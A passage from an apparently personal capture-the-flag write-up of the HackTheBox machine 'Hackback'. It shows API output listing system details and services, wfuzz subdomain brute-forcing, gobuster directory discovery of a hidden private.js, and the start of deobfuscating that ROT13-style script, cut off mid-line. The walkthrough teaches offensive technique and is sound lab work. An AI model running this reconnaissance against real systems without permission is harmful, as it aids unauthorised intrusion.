    </span><span class="nl">"OsDebug"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsDistributed"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsEncryptionLevel"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsForegroundApplicationBoost"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsTotalVisibleMemorySize"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsFreePhysicalMemory"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsTotalVirtualMemorySize"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsFreeVirtualMemory"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsInUseVirtualMemory"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsTotalSwapSpaceSize"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsSizeStoredInPagingFiles"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsFreeSpaceInPagingFiles"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsPagingFiles"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsHardwareAbstractionLayer"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsInstallDate"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsManufacturer"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsMaxNumberOfProcesses"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsMaxProcessMemorySize"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsMuiLanguages"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsNumberOfLicensedUsers"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsNumberOfProcesses"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsNumberOfUsers"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsOrganization"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsArchitecture"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsLanguage"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsProductSuites"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsOtherTypeDescription"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsPAEEnabled"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsPortableOperatingSystem"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsPrimary"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsProductType"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsRegisteredUser"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsSerialNumber"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsServicePackMajorVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsServicePackMinorVersion"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsSuites"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"OsServerLevel"</span><span class="p">:</span><span class="w">  </span><span class="mi">4</span><span class="p">,</span><span class="w">
    </span><span class="nl">"KeyboardLayout"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"TimeZone"</span><span class="p">:</span><span class="w">  </span><span class="s2">"(UTC-08:00) Pacific Time (US </span><span class="se">\u</span><span class="s2">0026 Canada)"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"LogonServer"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"PowerPlatformRole"</span><span class="p">:</span><span class="w">  </span><span class="mi">1</span><span class="p">,</span><span class="w">
    </span><span class="nl">"HyperVisorPresent"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"HyperVRequirementDataExecutionPreventionAvailable"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"HyperVRequirementSecondLevelAddressTranslation"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"HyperVRequirementVirtualizationFirmwareEnabled"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"HyperVRequirementVMMonitorModeExtensions"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"DeviceGuardSmartStatus"</span><span class="p">:</span><span class="w">  </span><span class="mi">0</span><span class="p">,</span><span class="w">
    </span><span class="nl">"DeviceGuardRequiredSecurityProperties"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"DeviceGuardAvailableSecurityProperties"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"DeviceGuardSecurityServicesConfigured"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"DeviceGuardSecurityServicesRunning"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"DeviceGuardCodeIntegrityPolicyEnforcementStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="nl">"DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus"</span><span class="p">:</span><span class="w">  </span><span class="kc">null</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/services</code> lists the services, that’s also important and we might need it later :</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">root@kali:~/Desktop/HTB/boxes/hackback#</span><span class="w"> </span><span class="err">curl</span><span class="w"> </span><span class="err">http://hackback.htb:</span><span class="mi">6666</span><span class="err">/services</span><span class="w">
</span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"AJRouter"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"startname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"NT AUTHORITY</span><span class="se">\\</span><span class="s2">LocalService"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"displayname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"AllJoyn Router Service"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"status"</span><span class="p">:</span><span class="w">  </span><span class="s2">"OK"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"ALG"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"startname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"NT AUTHORITY</span><span class="se">\\</span><span class="s2">LocalService"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"displayname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"Application Layer Gateway Service"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"status"</span><span class="p">:</span><span class="w">  </span><span class="s2">"OK"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"AppHostSvc"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"startname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"localSystem"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"displayname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"Application Host Helper Service"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"status"</span><span class="p">:</span><span class="w">  </span><span class="s2">"OK"</span><span class="w">
    </span><span class="p">},</span><span class="w">

    </span><span class="err">-------------------</span><span class="w">
    </span><span class="err">Removed</span><span class="w"> </span><span class="err">Long</span><span class="w"> </span><span class="err">Output</span><span class="w">
    </span><span class="err">-------------------</span><span class="w">
    
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"WpnService"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"startname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"LocalSystem"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"displayname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"Windows Push Notifications System Service"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"status"</span><span class="p">:</span><span class="w">  </span><span class="s2">"OK"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"WSearch"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"startname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"LocalSystem"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"displayname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"Windows Search"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"status"</span><span class="p">:</span><span class="w">  </span><span class="s2">"OK"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nl">"name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"wuauserv"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"startname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"LocalSystem"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"displayname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"Windows Update"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"status"</span><span class="p">:</span><span class="w">  </span><span class="s2">"OK"</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/netstat</code> lists the listening ports, we can check that when we need to know about some internal services but for now we will just ignore it. The rest of the commands are not really doing anything useful. I tried to exploit this service since it’s executing system commands, however it wasn’t possible.<br>
I used <code class="language-plaintext highlighter-rouge">wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank" rel="noopener noreferrer">subdomains-top1million-5000.txt</a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">seclists</a> to enumerate any possible subdomains :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# wfuzz --hc 614 -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.hackback.htb" http://10.10.10.128

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****                              
Target: http://10.10.10.128/
Total requests: 4997

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000007:  C=200     33 L       54 W          614 Ch        "webdisk"
000008:  C=200     33 L       54 W          614 Ch        "pop"
000001:  C=200     33 L       54 W          614 Ch        "www"
000002:  C=200     33 L       54 W          614 Ch        "mail"
000005:  C=200     33 L       54 W          614 Ch        "webmail"
000006:  C=200     33 L       54 W          614 Ch        "smtp"
000009:  C=200     33 L       54 W          614 Ch        "cpanel"
000010:  C=200     33 L       54 W          614 Ch        "whm"
000003:  C=200     33 L       54 W          614 Ch        "ftp"
000004:  C=200     33 L       54 W          614 Ch        "localhost"
000011:  C=200     33 L       54 W          614 Ch        "ns1"
000013:  C=200     33 L       54 W          614 Ch        "autodiscover"
000014:  C=200     33 L       54 W          614 Ch        "autoconfig"
000015:  C=200     33 L       54 W          614 Ch        "ns"
000016:  C=200     33 L       54 W          614 Ch        "test"
000012:  C=200     33 L       54 W          614 Ch        "ns2"
000017:  C=200     33 L       54 W          614 Ch        "m"
000020:  C=200     33 L       54 W          614 Ch        "www2"
000021:  C=200     33 L       54 W          614 Ch        "ns3"
000018:  C=200     33 L       54 W          614 Ch        "blog"
000019:  C=200     33 L       54 W          614 Ch        "dev"
000023:  C=200     33 L       54 W          614 Ch        "forum"
000022:  C=200     33 L       54 W          614 Ch        "pop3"
000026:  C=200     33 L       54 W          614 Ch        "vpn"
000025:  C=200     33 L       54 W          614 Ch        "mail2"
000024:  C=200     27 L       66 W          825 Ch        "admin"
000027:  C=200     33 L       54 W          614 Ch        "mx"

^C 
Finishing pending requests...
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">admin</code> gave a different response length, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> :
<br><img src="/images/hackthebox/hackback/3.png" alt="" class="align-center"><br><br>
It had this login form :
<br><img src="/images/hackthebox/hackback/4.png" alt="" class="align-center"><br><br>
Which actually didn’t do anything :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"#"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- USERNAME INPUT --&gt;</span>
    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"username"</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">placeholder=</span><span class="s">"Enter Username"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- PASSWORD INPUT --&gt;</span>
    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"password"</span><span class="nt">&gt;</span>Password<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"Enter Password"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Log In"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"lost"</span><span class="nt">&gt;</span>Lost your Password?<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"signup"</span><span class="nt">&gt;</span>Don't have An account?<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>
<p>Also the password reset and sign-up pages are non-existent :
<br><img src="/images/hackthebox/hackback/5.png" alt="" class="align-center"><br><br>
By looking at the page source :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Admin Login<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/css/master.css"</span><span class="nt">&gt;</span>
<span class="c">&lt;!-- &lt;script SRC="js/.js"&gt;&lt;/script&gt; --&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"login-box"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"img/logo.png"</span> <span class="na">class=</span><span class="s">"avatar"</span> <span class="na">alt=</span><span class="s">"Avatar Image"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h1&gt;</span>Login Here<span class="nt">&lt;/h1&gt;</span>
      <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"#"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
        <span class="c">&lt;!-- USERNAME INPUT --&gt;</span>
        <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"username"</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/label&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">placeholder=</span><span class="s">"Enter Username"</span><span class="nt">&gt;</span>
        <span class="c">&lt;!-- PASSWORD INPUT --&gt;</span>
        <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"password"</span><span class="nt">&gt;</span>Password<span class="nt">&lt;/label&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"Enter Password"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Log In"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"lost"</span><span class="nt">&gt;</span>Lost your Password?<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"signup"</span><span class="nt">&gt;</span>Don't have An account?<span class="nt">&lt;/a&gt;</span>
      <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>We notice this weird comment : <code class="language-plaintext highlighter-rouge">&lt;!-- &lt;script SRC="js/.js"&gt;&lt;/script&gt; --&gt;</code>
However <code class="language-plaintext highlighter-rouge">/js</code> gave a <code class="language-plaintext highlighter-rouge">403</code> :
<br><img src="/images/hackthebox/hackback/6.png" alt="" class="align-center"><br><br>
I ran <code class="language-plaintext highlighter-rouge">gobuster</code> with <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> and <code class="language-plaintext highlighter-rouge">.js</code> extension :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirb/common.txt -x js
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://admin.hackback.htb/js/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : js
[+] Timeout      : 10s
=====================================================
2019/07/05 09:37:16 Starting gobuster
=====================================================
/private.js (Status: 200)
</code></pre></div></div>

<h2 id="script-deobfuscation">Script Deobfuscation</h2>
<p>By looking at <code class="language-plaintext highlighter-rouge">private.js</code> it’s not really what we expect a javascript file to be :</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
	<span class="nx">ine</span> <span class="nx">n</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="se">\</span><span class="s1">k57</span><span class="se">\</span><span class="s1">k78</span><span class="se">\</span><span class="s1">k49</span><span class="se">\</span><span class="s1">k6n</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k37</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k75</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k38</span><span class="se">\</span><span class="s1">k47</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k76</span><span class="se">\</span><span class="s1">k52</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k42</span><span class="se">\</span><span class="s1">k2o</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k71</span><span class="se">\</span><span class="s1">k33</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k75</span><span class="se">\</span><span class="s1">k4q</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k4p</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k67</span><span class="se">\</span><span class="s1">k63</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k69</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k59</span><span class="se">\</span><span class="s1">k31</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k45</span><span class="se">\</span><span class="s1">k45</span><span class="se">\</span><span class="s1">k67</span><span class="se">\</span><span class="s1">k47</span><span class="se">\</span><span class="s1">k38</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k71</span><span class="se">\</span><span class="s1">k37</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k6p</span><span class="se">\</span><span class="s1">k38</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k33</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">k41</span><span class="se">\</span><span class="s1">k63</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k4q</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k71</span><span class="se">\</span><span class="s1">k76</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k71</span><span class="se">\</span><span class="s1">k51</span><span class="se">\</span><span class="s1">k67</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k34</span><span class="se">\</span><span class="s1">k2s</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k32</span><span class="se">\</span><span class="s1">k6r</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k4q</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k68</span><span class="se">\</span><span class="s1">k5n</span><span class="se">\</span><span class="s1">k63</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k71</span><span class="se">\</span><span class="s1">k54</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k70</span><span class="se">\</span><span class="s1">k54</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k79</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k37</span><span class="se">\</span><span class="s1">k6r</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k68</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k51</span><span class="se">\</span><span class="s1">k58</span><span class="se">\</span><span class="s1">k4q</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k35</span><span class="se">\</span><span class="s1">k57</span><span class="se">\</span><span class="s1">k38</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k70</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k4r</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k76</span><span class="se">\</span><span class="s1">k41</span><span class="se">\</span><span class="s1">k6n</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k67</span><span class="se">\</span><span class="s1">k79</span><span class="se">\</span><span class="s1">k6o</span><span class="se">\</span><span class="s1">k3q</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k35</span><span class="se">\</span><span class="s1">k48</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k38</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k37</span><span class="se">\</span><span class="s1">k64</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k52</span><span class="se">\</span><span class="s1">k6q</span><span class="se">\</span><span class="s1">k4q</span><span class="se">\</span><span class="s1">k4q</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k4n</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k34</span><span class="se">\</span><span class="s1">k6n</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k6p</span><span class="se">\</span><span class="s1">k56</span><span class="se">\</span><span class="s1">k52</span><span class="se">\</span><span class="s1">k6r</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k74</span><span class="se">\</span><span class="s1">k37</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k37</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k30</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k6s</span><span class="se">\</span><span class="s1">k31</span><span class="se">\</span><span class="s1">k61</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k37</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k41</span><span class="se">\</span><span class="s1">k51</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k66</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k45</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k34</span><span class="se">\</span><span class="s1">k58</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k52</span><span class="se">\</span><span class="s1">k6n</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k6p</span><span class="se">\</span><span class="s1">k4q</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k46</span><span class="se">\</span><span class="s1">k7n</span><span class="se">\</span><span class="s1">k72</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k6q</span><span class="se">\</span><span class="s1">k7n</span><span class="se">\</span><span class="s1">k70</span><span class="se">\</span><span class="s1">k76</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k41</span><span class="se">\</span><span class="s1">k6n</span><span class="se">\</span><span class="s1">k43</span><span class="se">\</span><span class="s1">k75</span><span class="se">\</span><span class="s1">k42</span><span class="se">\</span><span class="s1">k7n</span><span class="se">\</span><span class="s1">k44</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k39</span><span class="se">\</span><span class="s1">k46</span><span class="se">\</span><span class="s1">k38</span><span class="se">\</span><span class="s1">k4s</span><span class="se">\</span><span class="s1">k34</span><span class="se">\</span><span class="s1">k77</span><span class="se">\</span><span class="s1">k71</span><span class="se">\</span><span class="s1">k5n</span><span class="se">\</span><span class="s1">k6r</span><span class="se">\</span><span class="s1">k57</span><span class="se">\</span><span class="s1">k73</span><span class="se">\</span><span class="s1">k4o</span><span class="se">\</span><span class="s1">k68</span><span class="dl">'</span><span class="p">];(</span><span class="nx">shapgvba</span><span class="p">(</span><span class="nx">p</span><span 